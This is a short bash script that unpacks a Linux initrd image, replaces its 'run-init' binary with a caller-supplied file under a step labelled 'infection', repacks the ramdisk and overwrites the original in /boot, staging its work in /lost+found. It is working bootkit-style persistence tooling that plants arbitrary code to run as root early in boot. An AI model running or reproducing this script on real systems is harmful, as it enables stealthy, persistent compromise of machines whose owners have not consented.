#!/bin/bash
# This script replaces the 'run-init' binary present in
# the given ramdisk image with the one given as argument

programname=$0

function usage {
    echo -e "\nUsage: $programname <run-init full-path> <initrd full-path>\n"
    exit 1
}

# checks if a file is passed as an argument
if [ $# -ne 2 ]; then
        usage
elif ! [ -f $1 ]; then
        usage
elif ! [ -f $2 ]; then
        usage
fi

initrd=$2
if ! [[ $initrd == *"/boot/initrd.img-"* ]]; then
        usage
fi

cd /lost+found
mkdir tmp
mkdir tmp/extracted

# ramdisk unpack
cp $initrd tmp/
cd tmp/
unmkinitramfs $initrd ./extracted/
cd extracted/

# infection
rm -f main/usr/bin/run-init
cp $1 main/usr/bin/run-init

# ramdisk repack
cd early/
find . -print0 | cpio --null --create --format=newc > /lost+found/tmp/newinitrd
cd ../early2/
find kernel -print0 | cpio --null --create --format=newc >> /lost+found/tmp/newinitrd
cd ../main/
find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/tmp/newinitrd

# ramdisk replacement
cd /lost+found
rm -f $initrd
cp tmp/newinitrd $initrd
rm -rf tmp/